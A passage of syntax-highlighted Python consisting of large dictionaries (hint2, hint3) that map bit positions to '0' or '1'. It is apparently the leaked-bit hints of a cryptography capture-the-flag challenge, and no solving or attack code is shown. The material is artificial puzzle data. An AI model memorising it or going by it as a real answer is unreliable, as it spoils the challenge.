class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">147</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">411</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">378</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">269</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">291</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">468</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">124</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">    hint2 = &#123;<span class="number">125</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">385</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">315</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">348</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">154</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">136</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">440</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">250</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">270</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">318</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">107</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">474</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">325</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">278</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">109</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">423</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">190</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">171</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">475</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">441</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">323</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">451</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">438</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">121</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">494</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">314</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">183</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">372</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">237</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">483</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">406</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">115</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">301</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">490</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">502</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">231</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">404</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">344</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">463</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">157</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">255</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">386</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">373</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">360</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">148</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">472</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">262</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">185</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">214</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">455</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">445</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">503</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">298</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">376</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">210</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">163</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">111</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">244</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">261</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">303</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">259</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">215</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">140</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">443</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">    hint3 = &#123;<span class="number">891</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">74</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">129</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">880</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">361</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1012</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">529</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">500</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">405</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">763</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">637</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">564</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">941</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">923</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1014</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">670</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">558</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">716</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">208</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">130</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">634</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">661</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">862</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">796</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">761</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">752</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">818</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">797</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">337</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">367</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">470</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">624</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">522</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">554</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">583</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">836</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">715</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">484</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">876</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">165</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">842</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">442</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">927</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">586</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">886</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">663</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">947</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">906</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">365</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">936</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">228</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">366</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">717</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">800</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">662</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">970</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">986</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">287</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">597</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">783</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">805</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">671</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">540</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">153</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">577</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">543</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">414</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">626</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">810</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">905</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">602</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">537</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">374</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">137</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">532</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">333</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">653</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1018</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">639</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">826</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">489</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">858</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">516</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">149</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">945</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">694</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">186</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">297</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">103</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">437</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">802</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">921</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">728</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">879</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">953</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">459</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">559</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">610</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">341</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">299</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">952</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">741</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">946</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">696</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">266</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">829</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">908</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">873</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">658</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">798</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">621</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">238</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">654</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">925</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">391</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">598</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">677</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">606</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">118</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">973</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">347</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">159</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">668</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">675</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">924</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">890</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">965</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">692</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">782</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">817</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">889</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">515</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">433</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">356</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">845</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">979</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">785</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">546</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">824</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">704</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">510</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">710</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1022</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">647</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">465</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">245</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">850</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">657</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1007</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">807</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">328</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">292</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">355</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">596</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">275</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1004</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">594</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">446</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">994</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">616</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">900</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">563</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">745</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">536</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">726</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">751</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">781</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">988</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">768</span>: <span class="string">&#x27;1&#x27;</span>, <span 